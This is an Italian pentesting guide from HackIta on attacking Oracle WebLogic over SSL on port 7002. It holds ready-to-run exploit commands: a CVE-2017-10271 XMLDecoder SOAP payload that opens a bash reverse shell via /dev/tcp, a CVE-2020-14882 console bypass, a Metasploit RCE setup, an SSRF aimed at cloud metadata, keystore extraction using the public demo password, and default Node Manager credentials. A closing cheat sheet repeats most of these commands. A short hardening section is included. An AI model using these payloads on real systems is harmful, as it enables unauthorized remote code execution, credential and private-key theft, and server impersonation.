---
title: 'Porta 7002 WebLogic SSL: HTTPS, T3S e RCE'
slug: porta-7002-weblogic-ssl
description: 'Porta 7002 WebLogic SSL nel pentest: console HTTPS, T3S, certificati TLS, CVE pre-auth e attacchi su Oracle WebLogic Server cifrato.'
image: /porta-7002-weblogic-ssl.webp
draft: true
date: 2026-04-15T00:00:00.000Z
categories:
  - networking
subcategories:
  - porte
tags:
  - WebLogic SSL
  - T3S
  - WebLogic RCE
---

La porta 7002 TCP è la versione cifrata di [Oracle WebLogic sulla porta 7001](https://hackita.it/articoli/porta-7001-weblogic). Serve HTTPS per la console web e le applicazioni, T3S per la comunicazione Java cifrata e IIOPS per CORBA over TLS. Per farla breve: tutte le vulnerabilità di WebLogic — le deserializzazioni, i bypass della console, le SSRF — funzionano identicamente sulla 7002. La cifratura TLS protegge il traffico dallo sniffing, ma non ferma un exploit che raggiunge direttamente il server. Il vero vantaggio per il pentester è che la 7002 rivela informazioni aggiuntive attraverso il certificato TLS: hostname interni, nome dell'organizzazione, CA interna e a volte Subject Alternative Names con tutti gli alias del server.

Per l'exploitation completa (CVE, console, T3, SSRF, post-exploitation), la guida di riferimento è la [porta 7001 WebLogic](https://hackita.it/articoli/porta-7001-weblogic). Questo articolo copre ciò che è specifico della 7002.

## Quando Trovi la 7002

Tre scenari comuni:

```
Scenario 1: Entrambe aperte (comune)
PORT     STATE SERVICE
7001/tcp open  http       ← HTTP + T3
7002/tcp open  ssl/http   ← HTTPS + T3S

Scenario 2: Solo 7002 (hardened)
7001/tcp closed
7002/tcp open  ssl/http   ← Tutto cifrato, 7001 disabilitata

Scenario 3: Porte non-standard
8443/tcp open  ssl/http   ← WebLogic su porta custom
```

Nel secondo scenario, l'admin ha forzato solo connessioni cifrate. Tutti i tool funzionano, servono solo i flag SSL/TLS.

## 1. Enumerazione

### Nmap

```bash
nmap -sV -p 7002 --script=ssl-cert,ssl-enum-ciphers 10.10.10.40
```

```
PORT     STATE SERVICE VERSION
7002/tcp open  ssl/http  Oracle WebLogic Server 14.1.1.0
| ssl-cert:
|   Subject: CN=wl-prod-01.corp.internal/O=Corp SpA/L=Milano/C=IT
|   Subject Alternative Name: DNS:wl-prod-01.corp.internal, DNS:weblogic.corp.com, DNS:erp.corp.com
|   Issuer: CN=Corp-Internal-CA, O=Corp SpA
|   Not valid after: 2027-06-15
| ssl-enum-ciphers:
|   TLSv1.2:
|     ciphers:
|       TLS_RSA_WITH_AES_256_CBC_SHA256 - strong
|   TLSv1.0:
|     ciphers:
|       TLS_RSA_WITH_RC4_128_SHA - weak
```

**Intelligence dal certificato:**

* **CN**: hostname interno `wl-prod-01.corp.internal`
* **SAN**: tre alias → `wl-prod-01.corp.internal`, `weblogic.corp.com`, `erp.corp.com` (è un ERP!)
* **Issuer**: CA interna `Corp-Internal-CA` → conferma ADCS attivo → vettore per [ADCS abuse](https://hackita.it/articoli/porta-5986-winrm-https)
* **Cipher**: TLSv1.0 con RC4 → finding di sicurezza (cifratura debole)

### Console admin via HTTPS

```bash
curl -sk https://10.10.10.40:7002/console/login/LoginForm.jsp | grep -i version
```

Il flag `-k` ignora la verifica del certificato (self-signed o CA interna).

### T3S protocol test

```bash
# T3 over TLS
nmap -p 7002 --script=ssl-cert 10.10.10.40
# Se il servizio risponde, T3S è attivo insieme a HTTPS
```

## 2. Exploitation — Tutto Funziona su TLS

### CVE-2017-10271 via HTTPS

```bash
curl -sk https://10.10.10.40:7002/wls-wsat/CoordinatorPortType \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java version="1.8" class="java.beans.XMLDecoder">
        <void class="java.lang.ProcessBuilder">
          <array class="java.lang.String" length="3">
            <void index="0"><string>/bin/bash</string></void>
            <void index="1"><string>-c</string></void>
            <void index="2"><string>bash -i &gt;&amp; /dev/tcp/10.10.10.200/4444 0&gt;&amp;1</string></void>
          </array>
          <void method="start"/>
        </void>
      </java>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>'
```

Identico alla 7001, aggiunto `-k` per HTTPS e `https://` nello URL.

### CVE-2020-14882 Console Bypass via HTTPS

```bash
curl -sk "https://10.10.10.40:7002/console/css/%252e%252e%252fconsole.portal"
```

### Metasploit su porta SSL

```bash
use exploit/multi/http/oracle_weblogic_wsat_deserialization_rce
set RHOSTS 10.10.10.40
set RPORT 7002
set SSL true
set LHOST 10.10.10.200
run
```

Il flag `set SSL true` è tutto ciò che serve per switchare dalla 7001 alla 7002.

### SSRF via UDDI su HTTPS

```bash
curl -sk "https://10.10.10.40:7002/uddiexplorer/SearchPublicRegistries.jsp?operator=http://169.254.169.254/latest/meta-data/&rdoSearch=name&txtSearchname=a&btnSubmit=Search"
```

### Nuclei su HTTPS

```bash
nuclei -u https://10.10.10.40:7002 -tags weblogic
```

## 3. TLS-Specific Findings

### Cipher deboli

```bash
# Test completo dei cipher
sslscan 10.10.10.40:7002
```

```bash
# Oppure con testssl.sh (più dettagliato)
testssl.sh https://10.10.10.40:7002
```

Finding comuni su WebLogic:

* **TLSv1.0 / TLSv1.1 abilitati** → protocolli deprecati
* **RC4, DES, 3DES** → cipher deboli
* **Certificato self-signed** → nessuna validazione CA
* **Certificato scaduto** → segnale di manutenzione carente → probabilmente non patchato

### Certificate theft

Se riesci a ottenere il certificato server con la chiave privata (da accesso al filesystem post-exploitation):

```bash
# Cerca keystore Java
find / -name "*.jks" -o -name "*.p12" -o -name "*.keystore" 2>/dev/null
```

```bash
# WebLogic keystore tipico
/u01/oracle/user_projects/domains/base_domain/security/DemoIdentity.jks
```

```bash
# Estrai con keytool
keytool -list -keystore DemoIdentity.jks -storepass DemoIdentityKeyStorePassPhrase
```

La password del keystore demo è pubblica: `DemoIdentityKeyStorePassPhrase`. Se l'admin non l'ha cambiata → hai il certificato e la chiave privata → puoi impersonare il server (MITM) o usare il certificato per autenticarti ad altri servizi nella PKI.

## 4. Node Manager (porta 5556)

Il Node Manager gestisce i server WebLogic nel dominio. Se esposto:

```bash
# Connessione (richiede credenziali, spesso le stesse della console)
# Default: weblogic / welcome1
wlst.sh
connect('weblogic','welcome1','t3s://10.10.10.40:5556')
```

Da Node Manager puoi: avviare/fermare server, leggere log, eseguire script — un altro path per il controllo dell'infrastruttura.

## 5. Detection & Hardening

Tutti gli hardening della [porta 7001](https://hackita.it/articoli/porta-7001-weblogic) si applicano, più:

* **Solo TLS 1.2+** — disabilita TLS 1.0 e 1.1 nel config.xml
* **Cipher forti** — AES-256-GCM, ECDHE key exchange
* **Certificato firmato da CA** — no self-signed in produzione
* **Keystore con password forte** — non il default `DemoIdentityKeyStorePassPhrase`
* **HSTS header** per forzare HTTPS
* **Disabilita la porta 7001** se tutta la comunicazione può essere cifrata
* **mTLS** (mutual TLS) per l'accesso alla console e tra nodi

## 6. Cheat Sheet Finale

| Azione         | Comando                                                                     |
| -------------- | --------------------------------------------------------------------------- |
| Nmap + cert    | `nmap -sV -p 7002 --script=ssl-cert,ssl-enum-ciphers target`                |
| Console HTTPS  | `curl -sk https://target:7002/console/`                                     |
| WLS-WSAT HTTPS | `curl -sk https://target:7002/wls-wsat/CoordinatorPortType`                 |
| Console bypass | `curl -sk "https://target:7002/console/css/%252e%252e%252fconsole.portal"`  |
| SSRF UDDI      | `curl -sk "https://target:7002/uddiexplorer/...?operator=http://INTERNAL/"` |
| MSF SSL flag   | `set RPORT 7002` + `set SSL true`                                           |
| Nuclei         | `nuclei -u https://target:7002 -tags weblogic`                              |
| TLS scan       | `sslscan target:7002` oppure `testssl.sh https://target:7002`               |
| Keystore       | `find / -name "*.jks" -o -name "*.keystore"`                                |
| Keytool        | `keytool -list -keystore file.jks -storepass password`                      |

***

Riferimento: Oracle WebLogic Security, HackTricks WebLogic, TLS best practices. Uso esclusivo in ambienti autorizzati.
[https://kabaneridev.gitbook.io/pentesting-notes/certification-preparation/cpts-prep/web-application-attacks/attacking-common-applications/other-notable-applications](https://kabaneridev.gitbook.io/pentesting-notes/certification-preparation/cpts-prep/web-application-attacks/attacking-common-applications/other-notable-applications)

> Ogni articolo di HackIta è gratuito e lo resterà. Se ti è utile, considera una [donazione](https://hackita.it/dona) per sostenere il progetto. Per un percorso di crescita strutturato: [formazione 1:1 in ethical hacking](https://hackita.it/formazione).
